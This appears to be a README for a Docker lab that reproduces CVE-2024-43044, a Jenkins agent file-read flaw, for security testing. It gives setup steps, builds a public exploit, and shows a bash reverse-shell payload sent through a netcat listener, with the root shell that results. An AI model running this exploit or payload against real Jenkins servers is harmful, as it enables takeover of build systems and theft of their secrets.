# CVE-2024-43044
Jenkins 2.470 and earlier, LTS 2.452.3 and earlier allows agent processes to read arbitrary files from the Jenkins controller file system by using the `ClassLoaderProxy#fetchJar` method in the Remoting library.

## Metrics
CVSSv2: N\A  
CVSSv3: 8.8 HIGH  

## Vulnerability Environment
Build and run:

```shell
docker compose build
docker compose up -d
```

Setup ssh cerificates and agent via Jenkins console:
1. Go to http://your-ip:8080/script
2. Insert config:
```groovy
def jenkinsHome = System.getenv('JENKINS_HOME')
def command1 = "java -jar ${jenkinsHome}/jar/jenkins-cli.jar -s http://localhost:8080/ groovy = < ${jenkinsHome}/groovy/add-credentials.groovy"
println new ProcessBuilder('sh','-c',command1).redirectErrorStream(true).start().text

def command2 = "java -jar ${jenkinsHome}/jar/jenkins-cli.jar -s http://localhost:8080/ -auth admin:admin create-node vulnforge-agent < ${jenkinsHome}/xml/add-agent.xml"
println new ProcessBuilder('sh','-c',command2).redirectErrorStream(true).start().text
```
3. Connect to agent and build exploit
```shell
ssh jenkins@your-ip -p 2222 -i ssh/jenkins_key
```
```shell
git clone https://github.com/convisolabs/CVE-2024-43044-jenkins
cd CVE-2024-43044-jenkins ; mvn package
```
Dry run:
```shell
java -jar target/CVE-2024-43044-1.0-SNAPSHOT.jar mode_attach http://jenkins:8080 id
```
```shell
jenkins@7e496555d0a5:~/CVE-2024-43044-jenkins$ java -jar target/CVE-2024-43044-1.0-SNAPSHOT.jar mode_attach http://jenkins:8080 "id"
MODE ATTACH
[*] Starting the exploit
    JAR file:              /home/jenkins/CVE-2024-43044-jenkins/target/CVE-2024-43044-1.0-SNAPSHOT.jar
    pid of remoting.jar:   587
    pid of SSH connection: 546
    cmd:                   id
    jenkinsUrl:            http://jenkins:8080
Agent attached successfully.
```

## Detection and exploitation example
### Exploitation
On attacker machine:
```shell
nc -lvnp 4444
```

On agent container:
```shell
java -jar target/CVE-2024-43044-1.0-SNAPSHOT.jar mode_attach http://jenkins:8080 'bash -i >& /dev/tcp/192.168.93.63/4444 0>&1'
```

Got reverse shell:
```shell
❯ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 172.19.0.2 53432
bash: cannot set terminal process group (7): Inappropriate ioctl for device
bash: no job control in this shell
root@6cc809610588:/# whoami
whoami
root
root@6cc809610588:/# 
```

## Exploits and PoCs
https://github.com/convisolabs/CVE-2024-43044-jenkins

## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2024-4304](https://nvd.nist.gov/vuln/detail/cve-2024-43044)
[Conviso Blog: Analysis of CVE-2024-43044 — From file read to RCE in Jenkins through agents](https://blog.convisoappsec.com/en/analysis-of-cve-2024-43044/)  
[Habr: Анализ CVE-2024-43044 — от чтения файлов до удаленного выполнения кода в Jenkins через агентов](https://habr.com/ru/articles/850248/)  

## Notes and TODOs
- [ ] Add setup scripts to auto start with Jenkins init   
- [ ] Add (optional) agent with url\node\secret config  